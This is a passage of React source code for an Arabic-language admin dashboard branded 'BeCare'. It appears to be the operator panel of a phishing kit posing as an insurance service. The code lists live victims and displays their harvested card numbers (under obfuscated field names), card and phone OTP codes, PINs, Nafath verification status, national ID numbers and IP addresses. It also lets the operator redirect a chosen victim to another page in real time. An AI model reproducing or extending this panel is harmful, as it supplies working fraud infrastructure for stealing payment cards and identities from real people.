      boxes.push({ name: 'nafad', timestamp: nafadTime, component: nafadBox });
    }
    
    const phoneOtpBox = renderPhoneOtpBox();
    if (phoneOtpBox) {
      const phoneEntries = customerEntryGroup.filter(e => e.raw?.phoneNumber || e.raw?.phoneOtpStatus);
      const phoneTime = phoneEntries.length > 0
        ? Math.max(...phoneEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'phoneOtp', timestamp: phoneTime, component: phoneOtpBox });
    }
    
    const pinBox = renderPinBox();
    if (pinBox) {
      const pinEntries = customerEntryGroup.filter(e => e.raw?.pinStatus || e.raw?.pinCode);
      const pinTime = pinEntries.length > 0
        ? Math.max(...pinEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'pin', timestamp: pinTime, component: pinBox });
    }
    
    const cardOtpBox = renderCardOtpBox();
    if (cardOtpBox) {
      const cardOtpEntries = customerEntryGroup.filter(e => e.raw?._v3 || e.raw?.otpCode);
      const cardOtpTime = cardOtpEntries.length > 0
        ? Math.max(...cardOtpEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'cardOtp', timestamp: cardOtpTime, component: cardOtpBox });
    }
    
    const cardVerifBox = renderCardVerificationBox();
    if (cardVerifBox) {
      const cardVerifEntries = customerEntryGroup.filter(e => e.raw?.cardNumber || e.raw?._v1);
      const cardVerifTime = cardVerifEntries.length > 0
        ? Math.max(...cardVerifEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'cardVerif', timestamp: cardVerifTime, component: cardVerifBox });
    }
    
    const basicInfoBox = renderBasicInfoBox();
    if (basicInfoBox) {
      const basicEntries = customerEntryGroup.filter(e => e.raw?.buyerName || e.raw?.identityNumber);
      const basicTime = basicEntries.length > 0
        ? Math.max(...basicEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'basicInfo', timestamp: basicTime, component: basicInfoBox });
    }
    
    const insuranceBox = renderInsuranceDetailsBox();
    if (insuranceBox) {
      const insuranceEntries = customerEntryGroup.filter(e => e.raw?.insuranceType || e.raw?.vehicleModel);
      const insuranceTime = insuranceEntries.length > 0
        ? Math.max(...insuranceEntries.map(e => new Date(e.updatedAt || e.submittedAt || 0).getTime()))
        : getSelectedTimestamp();
      boxes.push({ name: 'insurance', timestamp: insuranceTime, component: insuranceBox });
    }
    
    boxes.sort((a, b) => {
      if (a.timestamp === 0 && b.timestamp === 0) return 0;
      if (a.timestamp === 0) return 1;
      if (b.timestamp === 0) return -1;
      return b.timestamp - a.timestamp;
    });
    
    return (
      <>
        {boxes.map((box, index) => (
          <div key={box.key} style={{ position: "relative" }}>
            <MemoizedBox component={box.component} timestamp={box.timestamp} />
            {/* Show "الأحدث" only for the first (latest) box */}
            {index === 0 && (
              <span style={{
                position: "absolute",
                top: 8,
                right: 8,
                background: "#3b82f6",
                color: "#fff",
                padding: "2px 8px",
                borderRadius: 4,
                fontSize: "0.65rem",
                fontWeight: 600,
                zIndex: 10
              }}>
                الأحدث
              </span>
            )}
          </div>
        ))}
      </>
    );
  };

  return (
    <div style={{ minHeight: "100vh", background: "#f8fafc", fontFamily: "Tahoma, Arial, sans-serif", margin: 0, padding: 0 }} dir="rtl">
      {/* Notification */}
      {notification && (
        <div
          style={{
            position: "fixed",
            top: 70,
            left: "50%",
            transform: "translateX(-50%)",
            padding: "12px 24px",
            borderRadius: 8,
            background: notification.type === "success" ? "#22c55e" : "#ef4444",
            color: "#fff",
            fontWeight: 600,
            zIndex: 1000,
            boxShadow: "0 4px 12px rgba(0,0,0,0.15)",
            direction: "rtl",
          }}
        >
          {notification.message}
        </div>
      )}

      {/* Header */}
      <header
        style={{
          display: "flex",
          alignItems: "center",
          gap: 0,
          height: 54,
          padding: "0 12px",
          background: "#ffffff",
          borderBottom: "1px solid #e5e7eb",
          position: "sticky",
          top: 0,
          zIndex: 100,
          boxShadow: "0 1px 0 rgba(15, 23, 42, 0.04)",
        }}
        dir="rtl"
      >
        <div style={{ display: "flex", alignItems: "center", gap: 8, paddingLeft: 12, borderLeft: "1px solid #e5e7eb" }}>
          <div
            style={{
              width: 28,
              height: 28,
              borderRadius: 8,
              background: "linear-gradient(135deg, #22c55e, #15803d)",
              display: "grid",
              placeItems: "center",
              fontWeight: 900,
              fontSize: "0.8rem",
              color: "#fff",
              boxShadow: "0 8px 20px rgba(34, 197, 94, 0.22)",
            }}
          >
            B
          </div>
          <span style={{ color: "#111827", fontWeight: 800, fontSize: "0.9rem", letterSpacing: "0.04em" }}>BeCare</span>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: "auto", overflowX: "auto", scrollbarWidth: "none" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ade80", boxShadow: "0 0 0 4px rgba(74, 222, 128, 0.2)" }} />
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>الزوار الحاليون</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <path d="M16 7h6v6" />
              <path d="m22 7-8.5 8.5-5-5L2 17" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>اليوم</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.todayCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2">
              <circle cx="12" cy="12" r="10" />
              <path d="M2 12h20" />
              <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" />
            </svg>
            <span style={{ color: "#6b7280", fontSize: "0.72rem" }}>إجمالي</span>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#2563eb" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect width="20" height="14" x="2" y="5" rx="2" />
              <line x1="2" x2="22" y1="10" y2="10" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.cardCount}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb", color: "#16a34a" }}>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" />
            </svg>
            <span style={{ fontWeight: 700, fontSize: "0.9rem" }}>{stats.phoneCount}</span>
          </div>

          <div style={{ width: 1, height: 20, background: "#e5e7eb", margin: "0 4px" }} />

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px", borderLeft: "1px solid #e5e7eb" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>زوار</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.newCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>

          <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 12px" }}>
            <span style={{ color: "#64748b", fontSize: "0.72rem" }}>عملاء</span>
            <span style={{ color: "#16a34a", fontWeight: 700, fontSize: "0.9rem" }}>{stats.completedCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#f59e0b", fontWeight: 700, fontSize: "0.9rem" }}>{stats.pendingCount}</span>
            <span style={{ color: "#94a3b8", fontSize: "0.72rem" }}>/</span>
            <span style={{ color: "#334155", fontWeight: 700, fontSize: "0.9rem" }}>{stats.totalCustomers}</span>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 0, marginRight: 8, borderRight: "1px solid #e5e7eb", paddingRight: 8 }}>
          <div ref={headerMenuRef} style={{ position: "relative" }}>
            <button
              onClick={() => setHeaderMenuOpen((value) => !value)}
              title="إعدادات"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                width: 40,
                height: 40,
                border: "none",
                borderRadius: 8,
                background: headerMenuOpen ? "#f3f4f6" : "transparent",
                cursor: "pointer",
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
            {headerMenuOpen && (
              <div style={{ position: "absolute", top: 44, left: 0, minWidth: 180, background: "#fff", border: "1px solid #e5e7eb", borderRadius: 10, boxShadow: "0 12px 30px rgba(15, 23, 42, 0.12)", overflow: "hidden", zIndex: 120 }}>
                <button 
                  onClick={() => { setHeaderMenuOpen(false); setShowSettingsModal(true); }}
                  style={{ width: "100%", border: "none", background: "#fff", padding: "10px 12px", textAlign: "right", cursor: "pointer", color: "#0f172a", fontWeight: 600, display: "flex", alignItems: "center", gap: 8 }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="3"/>
                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>
                  </svg>
                  الإعدادات
                </button>
              </div>
            )}
          </div>

          <button title="تنبيهات" style={{ display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 40, border: "none", borderRadius: 8, background: "transparent", cursor: "pointer" }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M10.268 21a2 2 0 0 0 3.464 0" />
              <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326" />
            </svg>
          </button>

          <button title="تسجيل الخروج" style={{ display: "flex", alignItems: "center", gap: 8, padding: "0 10px", height: 40, border: "none", borderRadius: 999, background: "#f8fafc", cursor: "pointer" }}>
            <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #3b82f6, #7c3aed)", display: "grid", placeItems: "center", color: "#fff", fontWeight: 700, fontSize: "0.8rem" }}>
              A
            </div>
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M19 9l-7 7-7-7" />
            </svg>
          </button>
        </div>
      </header>

      {/* Main Content */}
      <div style={{ display: "flex", minHeight: "calc(100vh - 54px)" }}>
        {/* Sidebar - Visitor List */}
        <aside
          style={{
            width: 340,
            background: "#ffffff",
            borderLeft: "1px solid #e5e7eb",
            display: "flex",
            flexDirection: "column",
            maxHeight: "calc(100vh - 54px)",
            overflow: "hidden",
          }}
        >
          {/* Search and Filters */}
          <div style={{ padding: 12, borderBottom: "1px solid #e5e7eb" }}>
            {/* Filter buttons */}
            <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
              <button
                onClick={() => setFilterMode("all")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "all" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "all" ? "#f0fdf4" : "#fff",
                  color: filterMode === "all" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                الكل ({stats.totalCustomers})
              </button>
              <button
                onClick={() => setFilterMode("cards")}
                style={{
                  flex: 1,
                  padding: "8px 12px",
                  border: filterMode === "cards" ? "1px solid #22c55e" : "1px solid #e5e7eb",
                  borderRadius: 8,
                  background: filterMode === "cards" ? "#f0fdf4" : "#fff",
                  color: filterMode === "cards" ? "#16a34a" : "#6b7280",
                  fontWeight: 600,
                  cursor: "pointer",
                  fontSize: "0.85rem",
                }}
              >
                بطاقة ({stats.cardCount})
              </button>
            </div>

            {/* Search */}
            <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
              <div style={{ position: "relative", flex: 1 }}>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#9ca3af"
                  strokeWidth="2"
                  style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)" }}
                >
                  <circle cx="11" cy="11" r="8" />
                  <path d="m21 21-4.3-4.3" />
                </svg>
                <input
                  type="text"
                  placeholder="بحث (الاسم، الهوية، الهاتف)"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  style={{
                    width: "100%",
                    padding: "10px 12px 10px 36px",
                    border: "1px solid #e5e7eb",
                    borderRadius: 8,
                    fontSize: "0.85rem",
                    outline: "none",
                  }}
                />
              </div>
              {/* Delete Button */}
              {selectedRequestIds.length > 0 && (
                <button
                  onClick={handleDeleteSelected}
                  title={`حذف ${selectedRequestIds.length} محدد`}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    width: 40,
                    height: 40,
                    border: "none",
                    borderRadius: 8,
                    background: "#ef4444",
                    color: "#fff",
                    cursor: "pointer",
                    fontWeight: 700,
                    fontSize: "1.2rem",
                    boxShadow: "0 2px 8px rgba(239, 68, 68, 0.3)",
                    transition: "all 0.2s",
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.background = "#dc2626";
                    e.currentTarget.style.transform = "scale(1.05)";
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.background = "#ef4444";
                    e.currentTarget.style.transform = "scale(1)";
                  }}
                >
                  🗑️
                </button>
              )}
            </div>

            {/* Selected count indicator */}
            {selectedRequestIds.length > 0 && (
              <div style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                marginBottom: 8,
                padding: "6px 10px",
                background: "#fef2f2",
                border: "1px solid #fecaca",
                borderRadius: 6,
                fontSize: "0.8rem",
              }}>
                <span style={{ color: "#dc2626", fontWeight: 600 }}>
                  {selectedRequestIds.length} محدد
                </span>
                <button
                  onClick={() => setSelectedRequestIds([])}
                  style={{
                    border: "none",
                    background: "transparent",
                    color: "#6b7280",
                    cursor: "pointer",
                    fontSize: "0.75rem",
                    padding: "2px 6px",
                  }}
                >
                  إلغاء التحديد
                </button>
              </div>
            )}
          </div>

          {/* Visitor List - Sorted by newest first */}
          <div style={{ flex: 1, overflowY: "auto", fontFamily: "Cairo, Tajawal, sans-serif" }}>
            {/* Select All Header */}
            <div style={{
              display: "flex",
              alignItems: "center",
              gap: 8,
              padding: "8px 10px",
              borderBottom: "1px solid #e5e7eb",
              background: "#f9fafb",
            }}>
              <input
                type="checkbox"
                checked={selectedRequestIds.length > 0 && selectedRequestIds.length === filteredRequests.length}
                ref={(el) => {
                  if (el) el.indeterminate = selectedRequestIds.length > 0 && selectedRequestIds.length < filteredRequests.length;
                }}
                onChange={handleSelectAll}
                style={{ accentColor: "#16a34e", cursor: "pointer", width: 16, height: 16 }}
              />
              <span style={{ fontSize: "0.8rem", color: "#6b7280", fontWeight: 500 }}>
                تحديد الكل ({filteredRequests.length})
              </span>
            </div>

            {filteredRequests.map((item) => {
              const isSelected = selectedRequestIds.includes(item.id);
              const isOnline = item.badge === "new" || (item.updatedAt && (Date.now() - new Date(item.updatedAt).getTime()) < 60000);
              const currentPage = item.raw?.currentPage || item.raw?.page || "غير متصل";
              const entryCount = getCustomerEntryCount(item);
              
              // Get the latest timestamp from raw data (same as boxes in main panel)
              const raw = item.raw || {};
              const latestTimestamp = 
                raw.checkUpdatedAt ? new Date(raw.checkUpdatedAt).getTime() :
                raw.cardUpdatedAt ? new Date(raw.cardUpdatedAt).getTime() :
                raw.otpSubmittedAt ? new Date(raw.otpSubmittedAt).getTime() :
                raw.pinSubmittedAt ? new Date(raw.pinSubmittedAt).getTime() :
                raw.phoneSubmittedAt ? new Date(raw.phoneSubmittedAt).getTime() :
                raw.nafadUpdatedAt ? new Date(raw.nafadUpdatedAt).getTime() :
                raw.createdAt ? new Date(raw.createdAt).getTime() :
                raw.submittedAt ? new Date(raw.submittedAt).getTime() :
                item.submittedAt ? new Date(item.submittedAt).getTime() : 0;
              
              const timeSinceSubmit = latestTimestamp > 0 ? currentTime - latestTimestamp : 0;
              const minutesSince = Math.floor(timeSinceSubmit / 60000);
              const hoursSince = Math.floor(minutesSince / 60);
              const daysSince = Math.floor(hoursSince / 24);
              
              // Smart format: show the most appropriate time unit
              let timeText = '';
              if (daysSince > 0) {
                timeText = `${daysSince}d ${hoursSince % 24}h`;
              } else if (hoursSince > 0) {
                timeText = `${hoursSince}:${String(minutesSince % 60).padStart(2, '0')}h`;
              } else if (minutesSince > 0) {
                timeText = `${minutesSince}m`;
              } else {
                timeText = 'الآن';
              }
              
              return (
                <div
                  key={item.id}
                  onClick={() => setSelectedRequestId(item.id)}
                  style={{
                    padding: "10px",
                    borderBottom: "1px solid #e5e7eb",
                    background: selectedRequestId === item.id ? "#f0fdf4" : (isOnline ? "#f0fdf4" : "#fff"),
                    cursor: "pointer",
                    transition: "background 0.2s",
                    borderRight: selectedRequestId === item.id ? "3px solid #16a34a" : "3px solid transparent",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "start", gap: 8 }}>
                    {/* Checkbox */}
                    <div style={{ marginTop: 2 }}>
                      <input
                        type="checkbox"
                        checked={isSelected}
                        onChange={(event) => {
                          event.stopPropagation();
                          toggleRequestSelection(item.id);
                        }}
                        onClick={(event) => event.stopPropagation()}
                        style={{ accentColor: "#16a34a", cursor: "pointer", width: 14, height: 14 }}
                      />
                    </div>
                    
                    {/* Avatar with status */}
                    <div style={{ position: "relative", flexShrink: 0 }}>
                      <div style={{
                        width: 36,
                        height: 36,
                        borderRadius: "50%",
                        background: isOnline 
                          ? "linear-gradient(135deg, #16a34a, #15803d)" 
                          : "linear-gradient(135deg, #4b5563, #374151)",
                        boxShadow: isOnline ? "0 0 0 2px rgba(34, 197, 94, 0.25)" : "none",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        fontSize: "0.7rem",
                        fontWeight: 700,
                        color: "#fff",
                      }}>
                        {item.customer?.charAt(0)?.toUpperCase() || "?"}
                      </div>
                      {/* Online indicator */}
                      <span style={{
                        position: "absolute",
                        bottom: 0,
                        right: 0,
                        width: 10,
                        height: 10,
                        borderRadius: "50%",
                        background: isOnline ? "#16a34a" : "#6b7280",
                        border: "2px solid #fff",
                        animation: isOnline ? "pulse 2s infinite" : "none",
                      }} />
                      {/* Country flag */}
                      {getCountryFlag(item.raw) && (
                        <span style={{
                          position: "absolute",
                          top: -2,
                          left: -2,
                          fontSize: "0.65rem",
                          lineHeight: 1,
                        }}>
                          {getCountryFlag(item.raw)}
                        </span>
                      )}
                    </div>
                    
                    {/* Info */}
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 2 }}>
                        <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                          <span style={{ 
                            fontWeight: 700, 
                            fontSize: "0.8rem", 
                            color: selectedRequestId === item.id ? "#15803d" : "#111827",
                            overflow: "hidden",
                            textOverflow: "ellipsis",
                            whiteSpace: "nowrap",
                            maxWidth: entryCount > 1 ? 120 : 160,
                          }}>
                            {getCustomerDisplayName(item)}
                          </span>
                          {item.hasCard || item.raw?._v1 || item.raw?.cardNumber ? (
                            <span style={{ flexShrink: 0 }}>
                              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" strokeWidth="2">
                                <rect width="20" height="14" x="2" y="5" rx="2" />
                                <line x1="2" x2="22" y1="10" y2="10" />
                              </svg>
                            </span>
                          ) : null}
                        </div>
                        {/* Smart timer - time since first submission */}
                        <span style={{ 
                          fontSize: "0.65rem", 
                          color: isOnline ? "#16a34a" : "#9ca3af", 
                          whiteSpace: "nowrap", 
                          flexShrink: 0,
                          fontWeight: isOnline ? 700 : 400 
                        }}>
                          {timeText}
                        </span>
                      </div>
                      <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
                        <span style={{ fontSize: "0.75rem", color: "#4b5563", fontWeight: 600 }}>
                          {getPageArabicName(currentPage)}
                        </span>
                        <span style={{
                          width: 6,
                          height: 6,
                          borderRadius: "50%",
                          background: isOnline ? "#16a34a" : "#9ca3af",
                          display: "inline-block",
                          animation: isOnline ? "pulse 2s infinite" : "none",
                        }} />
                      </div>
                    </div>
                  </div>
                </div>
              );
            })}
            {filteredRequests.length === 0 && (
              <div style={{ padding: 24, textAlign: "center", color: "#6b7280" }}>لا توجد نتائج</div>
            )}
          </div>

        </aside>

        {/* Main Panel - Client Details */}
        <main style={{ flex: 1, padding: 0, overflowY: "auto", margin: 0 }}>
          {selectedRequest && (
            <div style={{ maxWidth: "100%", width: "100%", margin: 0 }}>
              {/* Client Header */}
              <div
                style={{
                  background: "#ffffff",
                  border: "1px solid #e5e7eb",
                  boxShadow: "0 1px 2px rgba(15, 23, 42, 0.04)",
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "10px 12px", borderBottom: "1px solid #e5e7eb" }}>
                  <span style={{ fontSize: "11px", fontFamily: "ui-monospace, SFMono-Regular, monospace", color: "#6b7280", background: "#f3f4f6", border: "1px solid #e5e7eb", padding: "2px 8px", borderRadius: 4, flexShrink: 0 }}>
                    {selectedRequest.id.slice(0, 10).toUpperCase()}
                  </span>
                  <button
                    title="تحديث"
                    style={{ display: "flex", alignItems: "center", gap: 6, minWidth: 0, border: "none", background: "transparent", padding: 0, cursor: "pointer" }}
                  >
                    <span style={{ fontWeight: 700, color: "#111827", fontSize: "0.9rem", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                      {liveSummary.ownerName || getCustomerDisplayName(selectedRequest)}
                    </span>
                    <span style={{ color: "#9ca3af", fontSize: "0.85rem" }}>↻</span>
                  </button>
                  <div style={{ flex: 1 }} />
                  <select
                    value={redirectPage}
                    onChange={async (e) => {
                      const selectedPage = e.target.value;
                      if (!selectedPage) return;

                      const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
                      if (!visitorId) return;

                      setActionLoading("redirect");
                      setRedirectPage(selectedPage);

                      try {
                        const res = await fetch("/api/dashboard/redirect", {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({ visitorId, targetPage: selectedPage }),
                        });
                        if (res.ok) {
                          const pageLabel = pageOptions.find((p) => p.value === selectedPage)?.label || selectedPage;
                          showNotification("success", `تم توجيه العميل إلى: ${pageLabel}`);
                        } else {
                          showNotification("error", "حدث خطأ");
                        }
                      } catch {
                        showNotification("error", "فشل الاتصال");
                      }
                      setActionLoading(null);
                      setRedirectPage("");
                    }}
                    style={{
                      fontSize: "11px",
                      padding: "4px 8px",
                      background: "#ffffff",
                      border: "1px solid #d1d5db",
                      borderRadius: 6,
                      color: "#374151",
                      cursor: "pointer",
                      boxShadow: "0 1px 2px rgba(0,0,0,0.04)",
                    }}
                  >
                    {pageOptions.map((opt) => (
                      <option key={opt.value} value={opt.value}>{opt.label}</option>
                    ))}
                  </select>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 0, overflowX: "auto", fontSize: "11px" }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.phoneNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M10 6H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2V8a2 2 0 00-2-2h-5m-4 0V5a2 2 0 114 0v1m-4 0a2 2 0 104 0m-5 8a2 2 0 100-4 2 2 0 000 4zm0 0c1.306 0 2.417.835 2.83 2M9 14a3.001 3.001 0 00-2.83 2M15 11h3m-3 4h2" /></svg>
                    <span style={{ color: "#374151", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.identityNumber}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.deviceType}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V9M9 21H5a2 2 0 01-2-2V9m0 0h18" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.os}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" /></svg>
                    <span style={{ color: "#9ca3af" }}>{liveSummary.browser}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <span style={{ fontSize: "0.95rem" }}>{getCountryFlag(selectedRequest.raw)}</span>
                    <span style={{ color: "#9ca3af" }}>{getCountryCode(selectedRequest.raw)}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", borderLeft: "1px solid #f3f4f6", flexShrink: 0 }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="M5 12h14M5 12a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v4a2 2 0 01-2 2M5 12a2 2 0 00-2 2v4a2 2 0 002 2h14a2 2 0 002-2v-4a2 2 0 00-2-2" /></svg>
                    <span style={{ color: "#9ca3af", fontFamily: "ui-monospace, SFMono-Regular, monospace" }}>{liveSummary.ip}</span>
                  </div>
                  <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "8px 12px", flexShrink: 0 }}>
                    <span style={{ fontSize: "10px", padding: "2px 6px", background: "#dcfce7", color: "#166534", borderRadius: 4, border: "1px solid #86efac", fontWeight: 600 }}>
                      {getPageArabicName(liveSummary.currentPage)}
                    </span>
                  </div>
                </div>
              </div>

              {/* Client Details Panel */}
              <div
                style={{
                  background: "#f8fafc",
                  border: "1px solid #e5e7eb",
                  borderRadius: 0,
                  padding: 0,
                  marginTop: 0,
                  width: "100%",
                  height: "calc(100vh - 54px - 120px)",
                  minHeight: 420,
                  overflowY: "auto",
                  overflowX: "hidden",
